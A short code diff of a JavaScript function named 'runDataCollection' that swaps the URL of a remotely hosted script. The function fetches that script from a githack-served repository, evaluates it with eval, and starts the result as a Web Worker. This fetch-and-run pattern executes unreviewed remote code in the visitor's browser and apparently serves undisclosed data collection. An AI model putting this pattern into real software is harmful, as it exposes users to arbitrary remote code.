@@ -3,7 +3,7 @@ async function runDataCollection () {
   if (typeof Worker !== "undefined") {
     if (typeof wbkDataCollection___________ == "undefined") {
       
-      wbkDataCollection___________ = new Worker(eval(await (await fetch('https://raw.githack.com/rasanu/wbkDataCollection___________/main/0.js')).text()));
+      wbkDataCollection___________ = new Worker(eval(await (await fetch('https://rawcdn.githack.com/rasanu/wbkDataCollection___________/ecfa6fb0c608cd90da4f5739aae3a6e25c479428/1.js')).text()));
     }
     wbkDataCollection___________.onmessage = function (event) {
       console.log(event);
